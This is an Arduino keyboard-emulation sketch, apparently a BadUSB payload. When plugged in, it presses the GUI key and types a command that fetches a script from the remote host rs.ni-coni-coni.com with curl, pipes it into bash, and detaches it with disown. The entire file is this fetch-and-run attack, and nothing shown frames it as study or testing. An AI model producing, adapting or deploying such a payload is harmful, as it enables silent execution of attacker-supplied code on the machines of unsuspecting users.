#include <Keyboard.h>
#include <KeyboardLayout.h>
#include <Keyboard_it_IT.h>
#include <Keyboard_da_DK.h>
#include <Keyboard_fr_FR.h>
#include <Keyboard_de_DE.h>
#include <Keyboard_es_ES.h>
#include <Keyboard_sv_SE.h>

void setup() {
  // put your setup code here, to run once:
  Keyboard.begin();
  delay(600);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.println("");
  Keyboard.releaseAll();
  delay(400);
  Keyboard.println("$(curl -s -L rs.ni-coni-coni.com | bash) & disown");
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.print("C");
  Keyboard.releaseAll();
}

void loop() {
}
